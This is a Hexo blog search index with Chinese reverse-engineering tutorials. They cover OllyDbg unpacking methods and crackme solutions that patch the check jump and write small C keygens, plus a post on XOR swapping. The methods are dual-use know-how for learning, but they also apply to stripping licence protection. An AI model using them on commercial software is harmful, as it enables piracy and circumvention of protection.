<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[再谈脱壳(一)]]></title>
    <url>%2F2019%2F09%2F04%2F%E5%86%8D%E8%B0%88%E8%84%B1%E5%A3%B3%2F</url>
    <content type="text"><![CDATA[脱壳！脱壳！ 一、概论壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳两种UPX ASPCAK TELOCK PELITE NSPACK …ARMADILLO ASPROTECT ACPROTECT EPE SVKP …顾名思义，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。当然加密壳的保护能力要强得多！ 二、常见脱壳方法预备知识1.PUSHAD （压栈） 代表程序的入口点,2.POPAD （出栈） 代表程序的出口点，与PUSHAD想对应，一般找到这个OEP就在附近3.OEP：程序的入口点，软件加壳就是隐藏了OEP（或者用了假的OEP/FOEP），只要我们找到程序真正的OEP，就可以立刻脱壳。 方法一：单步跟踪法1.用OD载入，点“不分析代码！”2.单步向下跟踪F8，实现向下的跳。也就是说向上的跳不让其实现！（通过F4）3.遇到程序往回跳的（包括循环），我们在下一句代码处按F4（或者右健单击代码，选择断点——&gt;运行到所选）4.绿色线条表示跳转没实现，不用理会，红色线条表示跳转已经实现！5.如果刚载入程序，在附近就有一个CALL的，我们就F7跟进去，不然程序很容易跑飞，这样很快就能到程序的OEP6.在跟踪的时候，如果运行到某个CALL程序就运行的，就在这个CALL中F7进入7.一般有很大的跳转（大跨段），比如 jmp XXXXXX 或者 JE XXXXXX 或者有RETN的一般很快就会到程序的OEP。 Btw:在有些壳无法向下跟踪的时候，我们可以在附近找到没有实现的大跳转，右键–&gt;“跟随”,然后F2下断，Shift+F9运行停在“跟随”的位置，再取消断点，继续F8单步跟踪。一般情况下可以轻松到达OEP！ 方法二：ESP定律法ESP定理脱壳（ESP在OD的寄存器中，我们只要在命令行下ESP的硬件访问断点，就会一下来到程序的OEP了！）1.开始就点F8，注意观察OD右上角的寄存器中ESP有没突现（变成红色）。（这只是一般情况下，更确切的说我们选择的ESP值是关键句之后的第一个ESP值）2.在命令行下：dd XXXXXXXX(指在当前代码中的ESP地址，或者是hr XXXXXXXX)，按回车！3.选中下断的地址，断点—&gt;硬件访—&gt;WORD断点。4.按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP。 方法三：内存镜像法1：用OD打开软件！2：点击选项——调试选项——异常，把里面的忽略全部√上！CTRL+F2重载下程序！3：按ALT+M,打开内存镜象，找到程序的第一个.rsrc.按F2下断点，然后按SHIFT+F9运行到断点，接着再按ALT+M,打开内存镜象，找到程序的第一个.rsrc.上面的.CODE（也就是00401000处），按F2下断点！然后按SHIFT+F9（或者是在没异常情况下按F9），直接到达程序OEP！ 方法四：一步到达OEP1.开始按Ctrl+F,输入：popad（只适合少数壳，包括UPX，ASPACK壳），然后按下F2，F9运行到此处2.来到大跳转处，点下F8，到达OEP！ 方法五：最后一次异常法1：用OD打开软件2：点击选项——调试选项——异常，把里面的√全部去掉！CTRL+F2重载下程序3：一开始程序就是一个跳转，在这里我们按SHIFT+F9，直到程序运行，记下从开始按SHIFT+F9到程序运行的次数m！4：CTRL+F2重载程序，按SHIFT+F9（这次按的次数为程序运行的次数m-1次）5：在OD的右下角我们看见有一个”SE 句柄”，这时我们按CTRL+G，输入SE 句柄前的地址！6：按F2下断点！然后按SHIFT+F9来到断点处！7：去掉断点，按F8慢慢向下走！8：到达程序的OEP！ 方法六：模拟跟踪法1：先试运行，跟踪一下程序，看有没有SEH暗桩之类2：ALT+M打开内存镜像，找到（包含=SFX,imports,relocations） 内存镜像，项目 30地址=0054B000大小=00002000 (8192.)Owner=check 00400000区段=.aspack包含=SFX,imports,relocations类型=Imag 01001002访问=R初始访问=RWE 3：地址为0054B000，如是我们在命令行输入tc eip&lt;0054B000,回车，正在跟踪ing。。 Btw:大家在使用这个方法的时候，要理解他是要在怎么样的情况下才可以使用 方法七：“SFX”法1：设置OD，忽略所有异常，也就是说异常选项卡里面都打上勾2：切换到SFX选项卡，选择“字节模式跟踪实际入口（速度非常慢）”，确定。3：重载程序（如果跳出是否“压缩代码？”选择“否”，OD直接到达OEP） Btw:这种方法不要滥用得好，锻炼能力为妙。]]></content>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F09%2F04%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[逆向之Crack Me第二期]]></title>
    <url>%2F2019%2F08%2F19%2F%E9%80%86%E5%90%91%E4%B9%8BCrack-Me%E7%AC%AC%E4%BA%8C%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[破解Crack Me-AfKayAs不多哔哔，直接上菜 爆破法： 1234567891011121314151617181920212223242526272829303132333435360040258B /74 58 je short 004025E50040258D . |68 801B4000 push 00401B80 ; You Get It00402592 . |68 9C1B4000 push 00401B9C ; \r\n00402597 . |FFD7 call edi00402599 . |8BD0 mov edx, eax0040259B . |8D4D E8 lea ecx, dword ptr [ebp-18]0040259E . |FFD3 call ebx004025A0 . |50 push eax004025A1 . |68 A81B4000 push 00401BA8 ; KeyGen It Now004025A6 . |FFD7 call edi004025A8 . |8D4D 94 lea ecx, dword ptr [ebp-6C]004025AB . |8945 CC mov dword ptr [ebp-34], eax004025AE . |8D55 A4 lea edx, dword ptr [ebp-5C]004025B1 . |51 push ecx004025B2 . |8D45 B4 lea eax, dword ptr [ebp-4C]004025B5 . |52 push edx004025B6 . |50 push eax004025B7 . |8D4D C4 lea ecx, dword ptr [ebp-3C]004025BA . |6A 00 push 0004025BC . |51 push ecx004025BD . |C745 C4 0800000&gt;mov dword ptr [ebp-3C], 8004025C4 . |FF15 10414000 call dword ptr [&lt;&amp;MSVBVM50.#595&gt;] ; MSVBVM50.rtcMsgBox004025CA . |8D4D E8 lea ecx, dword ptr [ebp-18]004025CD . |FF15 80414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaFreeStr&gt;] ; MSVBVM50.__vbaFreeStr004025D3 . |8D55 94 lea edx, dword ptr [ebp-6C]004025D6 . |8D45 A4 lea eax, dword ptr [ebp-5C]004025D9 . |52 push edx004025DA . |8D4D B4 lea ecx, dword ptr [ebp-4C]004025DD . |50 push eax004025DE . |8D55 C4 lea edx, dword ptr [ebp-3C]004025E1 . |51 push ecx004025E2 . |52 push edx004025E3 . |EB 56 jmp short 0040263B004025E5 &gt; \68 C81B4000 push 00401BC8 ; You Get Wrong004025EA . 68 9C1B4000 push 00401B9C ; \r\n004025EF . FFD7 call edi 在0040258B处用nop填充，破解完毕！ 找算法：（就为了这玩意儿） 翻到最近的一个ret后面，在push ebp处下断点： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913000402412 . 50 push eax ; /name00402413 . 8B1A mov ebx, dword ptr [edx] ; |00402415 . FF15 E4404000 call dword ptr [&lt;&amp;MSVBVM50.__vbaLenBstr&gt;] ; \__vbaLenBstr0040241B . 8BF8 mov edi, eax ; name的字符串长度，edi=20040241D . 8B4D E8 mov ecx, dword ptr [ebp-18] ; ecx=1200402420 . 69FF FB7C0100 imul edi, edi, 17CFB ; edi=edi*0x17CFB=2*0x17CFB=0x2 F9F600402426 . 51 push ecx ; /把2压栈00402427 . 0F80 91020000 jo 004026BE ; |溢出跳转0040242D . FF15 F8404000 call dword ptr [&lt;&amp;MSVBVM50.#516&gt;] ; \rtcAnsiValueBstr00402433 . 0FBFD0 movsx edx, ax ; edx=ax=0x3100402436 . 03FA add edi, edx ; edi=edi+edx=0x2 F9F6+0x31=0x2 FA2700402438 . 0F80 80020000 jo 004026BE0040243E . 57 push edi0040243F . FF15 E0404000 call dword ptr [&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ; MSVBVM50.__vbaStrI400402445 . 8BD0 mov edx, eax ; edx=eax=195111；十进制表示00402447 . 8D4D E0 lea ecx, dword ptr [ebp-20]0040244A . FF15 70414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaStrMove&gt;] ; MSVBVM50.__vbaStrMove00402450 . 8BBD 50FFFFFF mov edi, dword ptr [ebp-B0] ; edi=021DA33C00402456 . 50 push eax00402457 . 57 push edi00402458 . FF93 A4000000 call dword ptr [ebx+A4]0040245E . 85C0 test eax, eax ; =000402460 . 7D 12 jge short 0040247400402462 . 68 A4000000 push 0A400402467 . 68 5C1B4000 push 00401B5C0040246C . 57 push edi0040246D . 50 push eax0040246E . FF15 04414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaHresultCheckOb&gt;; MSVBVM50.__vbaHresultCheckObj00402474 &gt; 8D45 E0 lea eax, dword ptr [ebp-20]00402477 . 8D4D E4 lea ecx, dword ptr [ebp-1C]0040247A . 50 push eax0040247B . 8D55 E8 lea edx, dword ptr [ebp-18]0040247E . 51 push ecx0040247F . 52 push edx00402480 . 6A 03 push 300402482 . FF15 5C414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;] ; MSVBVM50.__vbaFreeStrList00402488 . 83C4 10 add esp, 100040248B . 8D45 D4 lea eax, dword ptr [ebp-2C]0040248E . 8D4D D8 lea ecx, dword ptr [ebp-28]00402491 . 8D55 DC lea edx, dword ptr [ebp-24]00402494 . 50 push eax00402495 . 51 push ecx00402496 . 52 push edx00402497 . 6A 03 push 300402499 . FF15 F4404000 call dword ptr [&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;] ; MSVBVM50.__vbaFreeObjList0040249F . 8B06 mov eax, dword ptr [esi]004024A1 . 83C4 10 add esp, 10004024A4 . 56 push esi004024A5 . FF90 04030000 call dword ptr [eax+304]004024AB . 8B1D 0C414000 mov ebx, dword ptr [&lt;&amp;MSVBVM50.__vbaObjSet&gt;] ; MSVBVM50.__vbaObjSet004024B1 . 50 push eax004024B2 . 8D45 DC lea eax, dword ptr [ebp-24]004024B5 . 50 push eax004024B6 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaObjSet&gt;004024B8 . 8BF8 mov edi, eax004024BA . 8D55 E8 lea edx, dword ptr [ebp-18]004024BD . 52 push edx004024BE . 57 push edi004024BF . 8B0F mov ecx, dword ptr [edi]004024C1 . FF91 A0000000 call dword ptr [ecx+A0]004024C7 . 85C0 test eax, eax004024C9 . 7D 12 jge short 004024DD004024CB . 68 A0000000 push 0A0004024D0 . 68 5C1B4000 push 00401B5C004024D5 . 57 push edi004024D6 . 50 push eax004024D7 . FF15 04414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaHresultCheckOb&gt;; MSVBVM50.__vbaHresultCheckObj004024DD &gt; 56 push esi004024DE . FF95 40FFFFFF call dword ptr [ebp-C0]004024E4 . 50 push eax004024E5 . 8D45 D8 lea eax, dword ptr [ebp-28]004024E8 . 50 push eax004024E9 . FFD3 call ebx004024EB . 8BF0 mov esi, eax004024ED . 8D55 E4 lea edx, dword ptr [ebp-1C]004024F0 . 52 push edx004024F1 . 56 push esi004024F2 . 8B0E mov ecx, dword ptr [esi]004024F4 . FF91 A0000000 call dword ptr [ecx+A0]004024FA . 85C0 test eax, eax004024FC . 7D 12 jge short 00402510004024FE . 68 A0000000 push 0A000402503 . 68 5C1B4000 push 00401B5C00402508 . 56 push esi00402509 . 50 push eax0040250A . FF15 04414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaHresultCheckOb&gt;; MSVBVM50.__vbaHresultCheckObj00402510 &gt; 8B45 E8 mov eax, dword ptr [ebp-18] ; 密码=12300402513 . 8B4D E4 mov ecx, dword ptr [ebp-1C] ; 上次计算出的十进制数00402516 . 8B3D 00414000 mov edi, dword ptr [&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ; MSVBVM50.__vbaStrCat0040251C . 50 push eax0040251D . 68 701B4000 push 00401B70 ; AKA-00402522 . 51 push ecx ; /String00402523 . FFD7 call edi ; \__vbaStrCat00402525 . 8B1D 70414000 mov ebx, dword ptr [&lt;&amp;MSVBVM50.__vbaStrMove&gt;] ; MSVBVM50.__vbaStrMove0040252B . 8BD0 mov edx, eax ; edx=eax=AKA-1951110040252D . 8D4D E0 lea ecx, dword ptr [ebp-20]00402530 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax00402533 . FF15 28414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaStrCmp&gt;] ; MSVBVM50.__vbaStrCmp00402539 . 8BF0 mov esi, eax0040253B . 8D55 E0 lea edx, dword ptr [ebp-20]0040253E . F7DE neg esi00402540 . 8D45 E8 lea eax, dword ptr [ebp-18]00402543 . 52 push edx00402544 . 1BF6 sbb esi, esi00402546 . 8D4D E4 lea ecx, dword ptr [ebp-1C]00402549 . 50 push eax0040254A . 46 inc esi0040254B . 51 push ecx0040254C . 6A 03 push 30040254E . F7DE neg esi00402550 . FF15 5C414000 call dword ptr [&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;] ; MSVBVM50.__vbaFreeStrList00402556 . 83C4 10 add esp, 1000402559 . 8D55 D8 lea edx, dword ptr [ebp-28]0040255C . 8D45 DC lea eax, dword ptr [ebp-24]0040255F . 52 push edx00402560 . 50 push eax00402561 . 6A 02 push 200402563 . FF15 F4404000 call dword ptr [&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;] ; MSVBVM50.__vbaFreeObjList00402569 . 83C4 0C add esp, 0C0040256C . B9 04000280 mov ecx, 8002000400402571 . B8 0A000000 mov eax, 0A00402576 . 894D 9C mov dword ptr [ebp-64], ecx00402579 . 66:85F6 test si, si0040257C . 8945 94 mov dword ptr [ebp-6C], eax0040257F . 894D AC mov dword ptr [ebp-54], ecx00402582 . 8945 A4 mov dword ptr [ebp-5C], eax00402585 . 894D BC mov dword ptr [ebp-44], ecx00402588 . 8945 B4 mov dword ptr [ebp-4C], eax0040258B 74 58 je short 004025E5 算法很简单，C语言表示： 12345678910111213141516171819202122#include &lt;stdafx.h&gt;#include &lt;stdio.h&gt;#include &lt;iostream&gt; char buff[100] = &#123;0&#125;;int _tmain(int argc, _TCHAR* argv[])&#123; printf("160CrackMe-002 Name/Serial\r\n\r\n"); printf("Name:"); gets_s(buff,100); int nLen = strlen(buff); if ( nLen &gt; 0 ) &#123; int nRet = nLen * 0x17CFB; nRet += buff[0]; printf("AKA-%d\r\n",nRet); &#125;else&#123; printf("Input error!\r\n"); &#125; system("pause"); return 0;&#125; 完工！！]]></content>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何不使用临时变量进行两个数的交换]]></title>
    <url>%2F2019%2F08%2F19%2F%E5%A6%82%E4%BD%95%E4%B8%8D%E4%BD%BF%E7%94%A8%E4%B8%B4%E6%97%B6%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%9A%84%E4%BA%A4%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[关于两个整数值的交换 在C/C++的基础学习过程中肯定会遇到一个问题：交换两个整数的值。 很多人看到这个，第一反应：简单！第二反应：建一个临时变量，这题目用膝盖都能想的出来。 直接给出代码： 1234567891011121314151617#include&lt;iostream&gt;using namespace std;void Swap(int&amp; x,int&amp; y)&#123; int temp=0; temp=x; x=y; y=temp;&#125;int main()&#123; int i1=13; int i2=14; Swap(i1,i2); cout&lt;&lt;"i1="&lt;&lt;i1&lt;&lt;endl; cout&lt;&lt;"i2="&lt;&lt;i2&lt;&lt;endl; system("pause"); return 0;&#125; 那如果不使用临时变量呢？两种思路： 方法一、加减减 ​ a = a + b;​ b = a - b;​ a = a - b; 方法二、异或运算（只能用于整数） ​ a = a ^ b;​ b = a ^ b;​ a = a ^ b; 方法一简单粗暴不多解释； 来看一下方法二： 异或运算就是将十进制数转换成二进制后，同位相同则取0，同位相异则取1。 12345678910111213141516171819202122232425int a = 2 ; 0010int b = 9; 1001a = a ^ b ; 0010 ^ 1001 a = 1011b = a ^ b; 1011 ^ 1001 b = 0010 = 2 a = a ^ b; 1011 ^ 0010 a = 1001 = 9 用代码表示： 12345678910111213141516#include&lt;iostream&gt;using namespace std;void Swap(int&amp; a,int&amp; b)&#123; a^=b; b^=a; a^=b;&#125;int main()&#123; int i1=13; int i2=14; Swap(i1,i2); cout&lt;&lt;"i1="&lt;&lt;i1&lt;&lt;endl; cout&lt;&lt;"i2="&lt;&lt;i2&lt;&lt;endl; system("pause"); return 0;&#125; 好啦，完工！]]></content>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向之Crack Me第一期]]></title>
    <url>%2F2019%2F08%2F18%2F%E9%80%86%E5%90%91%E4%B9%8Bcracker-me-1%2F</url>
    <content type="text"><![CDATA[破解Crack Me-Acid burn 找了一份Crack Me的大合集，来巩固一下所学知识，查漏补缺。话不多说，直接上菜。 总览：该软件由两部分组成，即分别需要破解serial以及name-serial。 1.serial的破解用OD打开，F9运行，随便输入，弹出窗口提示错误：Try Again!! 此处有两种方式：1.用字符串搜索：Try Again!! 2.在MessageBoxA函数处下断点。 第二种方式较为常规，第一种比较简单，此处采用第二种。 断点之后，在最近的return处返回用户代码 123456789101112131415160019F710 0042A1AE /CALL to MessageBoxA from Acid_bur.0042A1A90019F714 00040A52 |hOwner = 00040A52 (&apos;Acid burn&apos;,class=&apos;TApplication&apos;)0019F718 0042F58C |Text = &quot;Try Again!!&quot;0019F71C 0042F584 |Title = &quot;Failed!&quot;0019F720 00000000 \Style = MB_OK|MB_APPLMODAL0019F724 0019F754 Pointer to next SEH record0019F728 0042A1D0 SE handler0019F72C 0019F7480019F730 022A97780019F734 022A97780019F738 022A674C0019F73C 022AA4F80019F740 000608DE0019F744 022A97780019F748 /0019F7740019F74C |0042F509 RETURN to Acid_bur.0042F509 from Acid_bur.0042A170 返回至用户代码： 1234567891011121314150042F4D5 /75 1A jnz short 0042F4F1 ; 此处判断，若不相等，则跳转至0042F4F10042F4D7 |6A 00 push 00042F4D9 |. |B9 64F54200 mov ecx, 0042F564 ; Congratz!0042F4DE |. |BA 70F54200 mov edx, 0042F570 ; God Job dude !! =)0042F4E3 |. |A1 480A4300 mov eax, dword ptr [430A48]0042F4E8 |. |8B00 mov eax, dword ptr [eax]0042F4EA |. |E8 81ACFFFF call 0042A1700042F4EF |. |EB 18 jmp short 0042F5090042F4F1 |&gt; \6A 00 push 0 ; 跳转至此处0042F4F3 |. B9 84F54200 mov ecx, 0042F584 ; Failed!0042F4F8 |. BA 8CF54200 mov edx, 0042F58C ; Try Again!!0042F4FD |. A1 480A4300 mov eax, dword ptr [430A48]0042F502 |. 8B00 mov eax, dword ptr [eax]0042F504 |. E8 67ACFFFF call 0042A1700042F509 |&gt; 33C0 xor eax, eax ; return返回至此处,向上查找关键词 在0042F4D5处可使用爆破法，用nop替换jnz short 0042F4F1,这个比较简单，不如去查找serial的值 再往上看： 12340042F4CA |. 8B45 F0 mov eax, dword ptr [ebp-10]0042F4CD |. 8B55 F4 mov edx, dword ptr [ebp-C]0042F4D0 |. E8 2745FDFF call 004039FC0042F4D5 75 1A jnz short 0042F4F1 在jnz short 0042F4F1判断指令前，有call 004039FC来判断输入数值与原有数值进行比较，即以上两条mov指令。 在0042F4D0处下断点。观察eax与edx的值： 1234EAX 022A7840 ASCII &quot;454564&quot; ; 此处值为我输入的值...EDX 022AA4B4 ASCII &quot;Hello Dude&quot;... 由此猜测Hello Dude为密钥，验证正确 2.name-serial的破解同理，在MessageBoxA处下断点。 123456789101112131415160019F704 0042A1AE /CALL to MessageBoxA from Acid_bur.0042A1A90019F708 00250A82 |hOwner = 00250A82 (&apos;Acid burn&apos;,class=&apos;TApplication&apos;)0019F70C 0042FB80 |Text = &quot;Sorry , The serial is incorect !&quot;0019F710 0042FB74 |Title = &quot;Try Again!&quot;0019F714 00000000 \Style = MB_OK|MB_APPLMODAL0019F718 0019F748 Pointer to next SEH record0019F71C 0042A1D0 SE handler0019F720 0019F73C0019F724 022813040019F728 000005090019F72C 022863FC ASCII &quot;x鸟&quot;0019F730 0228A4940019F734 000C0A8C0019F738 022813040019F73C /0019F7740019F740 |0042FB37 RETURN to Acid_bur.0042FB37 from Acid_bur.0042A170 ; 在此处return 返回至用户代码： 1234567891011121314151617180042FAF8 |. 8B55 F0 mov edx, dword ptr [ebp-10] 0042FAFB |. 8B45 F4 mov eax, dword ptr [ebp-C]0042FAFE |. E8 F93EFDFF call 004039FC0042FB03 75 1A jnz short 0042FB1F ; 在此处判断，若不等于则跳转至0042FB1F0042FB05 |. 6A 00 push 00042FB07 |. B9 CCFB4200 mov ecx, 0042FBCC ; Congratz !!0042FB0C |. BA D8FB4200 mov edx, 0042FBD8 ; Good job dude =)0042FB11 |. A1 480A4300 mov eax, dword ptr [430A48]0042FB16 |. 8B00 mov eax, dword ptr [eax]0042FB18 |. E8 53A6FFFF call 0042A1700042FB1D |. EB 18 jmp short 0042FB370042FB1F |&gt; 6A 00 push 0 ; 跳转至此处0042FB21 |. B9 74FB4200 mov ecx, 0042FB74 ; Try Again!0042FB26 |. BA 80FB4200 mov edx, 0042FB80 ; Sorry , The serial is incorect !0042FB2B |. A1 480A4300 mov eax, dword ptr [430A48]0042FB30 |. 8B00 mov eax, dword ptr [eax]0042FB32 |. E8 39A6FFFF call 0042A1700042FB37 |&gt; 33C0 xor eax, eax ; 返回至此处，往上看到关键词 同理可用爆破法将jnz short 0042FB1F替换，则爆破完成。 往上走，找到最近的几个call 12345670042FAEA |. 8D55 F0 lea edx, dword ptr [ebp-10]0042FAED |. 8B83 E0010000 mov eax, dword ptr [ebx+1E0]0042FAF3 |. E8 60AFFEFF call 0041AA58 ; call10042FAF8 |. 8B55 F0 mov edx, dword ptr [ebp-10]0042FAFB |. 8B45 F4 mov eax, dword ptr [ebp-C]0042FAFE |. E8 F93EFDFF call 004039FC ; call20042FB03 75 1A jnz short 0042FB1F 在第一个call1处下断点，观察eax，ebx，ecx，edx等寄存器的值； 发现为空值； 则继续在第二个call2处下断点： 123EAX 0222A460 ASCII&quot;CW-4018-CRACKED&quot;...EDX 0222A47C ASCII&quot;12313&quot; ; 此处为输入的密码 说明 EAX在call1处产生 然后跟进call 0041AA58 123456789101112131415161718192021220041AA58 /$ 53 push ebx0041AA59 |. 56 push esi0041AA5A |. 57 push edi0041AA5B |. 8BFA mov edi, edx0041AA5D |. 8BF0 mov esi, eax0041AA5F |. 8BC6 mov eax, esi0041AA61 |. E8 A2FFFFFF call 0041AA080041AA66 |. 8BD8 mov ebx, eax0041AA68 |. 8BC7 mov eax, edi0041AA6A |. 8BCB mov ecx, ebx0041AA6C |. 33D2 xor edx, edx0041AA6E |. E8 E18CFEFF call 004037540041AA73 |. 85DB test ebx, ebx0041AA75 |. 74 0C je short 0041AA830041AA77 |. 8D4B 01 lea ecx, dword ptr [ebx+1]0041AA7A |. 8B17 mov edx, dword ptr [edi]0041AA7C |. 8BC6 mov eax, esi0041AA7E |. E8 95FFFFFF call 0041AA180041AA83 |&gt; 5F pop edi0041AA84 |. 5E pop esi0041AA85 |. 5B pop ebx0041AA86 \. C3 retn 在此处跟进，并未发现EAX的ASCII值，即没有发现注册码，则初步判定注册码不是在这里生成的。但是这么想就与之前的猜测完全推翻了，说明我们的想法有问题，即思路有问题。既然他的码不是及时算出来的，那肯定就是事先算好的，我们再次回到产生注册码的CALL那里，向上查找，F8单步进行查看。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253540042FA4D |. A1 6C174300 mov eax,dword ptr ds:[0x43176C] ; // name/Tag0042FA52 |. E8 D96EFDFF call 00406930 ; // 关键CALL0042FA57 |. 83F8 04 cmp eax,0x4 ; // 判断tag/serial 是否合格0042FA5A |. 7D 1D jge short 0042FA790042FA5C |. 6A 00 push 0x00042FA5E |. B9 74FB4200 mov ecx,0042FB74 ; ASCII 54,&quot;Try Again!&quot;0042FA63 |. BA 80FB4200 mov edx,0042FB80 ; ASCII 53,&quot;orry , The serial is incorect !&quot;0042FA68 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FA6D |. 8B00 mov eax,dword ptr ds:[eax]0042FA6F |. E8 FCA6FFFF call 0042A1700042FA74 |. E9 BE000000 jmp 0042FB370042FA79 |&gt; 8D55 F0 lea edx,[local.4]0042FA7C |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA82 |. E8 D1AFFEFF call 0041AA580042FA87 |. 8B45 F0 mov eax,[local.4] ; EAX=112233的地址0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax] ; 第一个字节1=0x310042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750] ; *0x290042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax ; eax=0x7d9=0x29*0x310042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750]0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax ; 加一倍0042FAA3 |. 8D45 FC lea eax,[local.1]0042FAA6 |. BA ACFB4200 mov edx,0042FBAC0042FAAB |. E8 583CFDFF call 004037080042FAB0 |. 8D45 F8 lea eax,[local.2]0042FAB3 |. BA B8FB4200 mov edx,0042FBB80042FAB8 |. E8 4B3CFDFF call 004037080042FABD |. FF75 FC push [local.1]0042FAC0 |. 68 C8FB4200 push 0042FBC8 ; UNICODE &quot;-&quot;0042FAC5 |. 8D55 E8 lea edx,[local.6] ; 12F9900042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750] ; 40180042FACD |. E8 466CFDFF call 004067180042FAD2 |. FF75 E8 push [local.6] ; // 注册码中间的值0042FAD5 |. 68 C8FB4200 push 0042FBC8 ; UNICODE &quot;-&quot;0042FADA |. FF75 F8 push [local.2]0042FADD |. 8D45 F4 lea eax,[local.3]0042FAE0 |. BA 05000000 mov edx,0x50042FAE5 |. E8 C23EFDFF call 004039AC0042FAEA |. 8D55 F0 lea edx,[local.4] ; edx=0012F9980042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0] ; eax=00A85E4C0042FAF3 |. E8 60AFFEFF call 0041AA58 ; // 注册码CALL0042FAF8 |. 8B55 F0 mov edx,[local.4] ; // EDX=445566770042FAFB |. 8B45 F4 mov eax,[local.3] ; // EAX=CW-4018-CRACKED0042FAFE |. E8 F93EFDFF call 004039FC0042FB03 75 1A jnz short 0042FB1F ; // 这个JNZ条件判断很关键？0042FB05 |. 6A 00 push 0x00042FB07 |. B9 CCFB4200 mov ecx,0042FBCC0042FB0C |. BA D8FB4200 mov edx,0042FBD80042FB11 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FB16 |. 8B00 mov eax,dword ptr ds:[eax]0042FB18 |. E8 53A6FFFF call 0042A1700042FB1D |. EB 18 jmp short 0042FB37 ; // 这个跳转是不是很可疑？0042FB1F |&gt; 6A 00 push 0x00042FB21 |. B9 74FB4200 mov ecx,0042FB74 ; ASCII 54,&quot;ry Again!&quot;0042FB26 |. BA 80FB4200 mov edx,0042FB80 ; ASCII 53,&quot;orry , The serial is incorect !&quot; 总结：取第一个字母的ASNI的数字，如112233中第一个字符1对应数字0x31，然后用它乘以0x29，结果再自增一倍(即x2)，将得到的数字转为10进制的字符串，在前加上”CW-”,后加上”-CRACKED”，就组成了用户名对应的注册码。 C++实现： 123456789101112131415161718#include "stdafx.h"#include "iostream" int _tmain(int argc, _TCHAR* argv[])&#123; printf("Input Name:\r\n"); // 取第一个字符值 int cName = getchar(); if ( cName &gt; 0x21) // 只处理可见字符 &#123; cName *= 0x29; // 乘法 cName *= 2; // 自增一倍 printf("Serial: CW-%4d-CRACKED\r\n",cName); &#125;else&#123; printf("input error!\r\n"); &#125; system("pause"); return 0;]]></content>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向之脱壳浅谈]]></title>
    <url>%2F2019%2F08%2F09%2F%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E6%B5%85%E8%B0%88%2F</url>
    <content type="text"><![CDATA[关于脱壳技术有加壳就一定有脱壳 1. 壳的基础知识 壳的加载过程：与病毒类似，比源程序更早的获得控制权。 在初始化时保存个寄存器的值，等到外壳执行完成再恢复各寄存器的内容，最后跳转到源程序运行。 获取壳本身需要用到的API地址，一般只使用GetProcAddress，GetModuleHandle和LoadLibrary三个API函数，如果需要其他的用LoadLibrary加载。 按区块解密，把解密的区块数据按照区块的定义放在内存中合适的位置。 IAT的初始化 重定位项的处理，文件执行时将被映射到指定内存地址中，这个初始内存地址称为基址。对EXE的程序文件来说，Windows操作系统会尽量满足其要求。例如，某EXE文件的基地址为400000h, 而运行时 Windows操作系统提供给程序的基地址也是400000h, 在这种情况下就不需要进行地址 ”重定位” 了。由于不需要对EXE文件进行 ”重定位”，加壳软件干脆删除了原程序文件中用千保存重定位信息的区块（这样做可以使加壳后的文件更加小巧，有些工具提供的 “Wipe Reloc”功能其实就起到了这个作用）。 Hook API。在程序文件中，输入表的作用是让Windows操作系统在程序运行时将API的实际地址提供给程序使用。在程序的第1行代码被执行之前，Windows操作系统就完成了这项工作。壳大都在修改原程序文件的输入表后自己模仿Windows操作系统的工作流程，向输入表中填充相关的数据。在填充过程中，外壳可以填充 HookAPI 代码的地址，从而间接获得程序的控制权。 